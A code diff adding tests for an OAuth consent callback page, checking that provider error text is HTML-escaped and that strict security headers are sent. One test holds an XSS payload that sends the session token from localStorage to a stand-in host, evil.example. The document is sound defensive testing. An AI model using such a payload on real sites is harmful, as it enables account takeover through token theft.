@@ -191,6 +191,34 @@ class TestConnectFlow:
         body = client.get("/v1/integrations/mailboxes", headers=account["headers"]).json()
         assert body["connections"] == []
 
+    def test_provider_error_text_cannot_inject_markup(self, client, ms_configured):
+        """The consent page is the one unauthenticated HTML this API serves.
+
+        The ``error`` branch answers before ``state`` is validated, so anyone
+        can choose this text; nginx serves the app from this same origin and
+        the session token sits in its localStorage. Reflecting it raw is
+        account takeover, so the escaping is load-bearing.
+        """
+        payload = "<script>fetch('//evil.example/'+localStorage.token)</script>"
+        response = client.get(
+            "/v1/integrations/microsoft/callback",
+            params={"error": "access_denied", "error_description": payload},
+        )
+
+        assert response.status_code == 200
+        assert payload not in response.text
+        assert "<script>" not in response.text
+        assert "&lt;script&gt;" in response.text
+        assert "script-src" not in response.headers.get("content-security-policy", "")
+
+    def test_the_unauthenticated_callback_page_forbids_script(
+        self, client, ms_configured
+    ):
+        response = client.get("/v1/integrations/microsoft/callback?error=access_denied")
+        csp = response.headers.get("content-security-policy", "")
+        assert "default-src 'none'" in csp
+        assert response.headers.get("x-content-type-options") == "nosniff"
+
     def test_disconnect_revokes_and_clears_tokens(
         self, client, account, session, ms_configured, monkeypatch
     ):
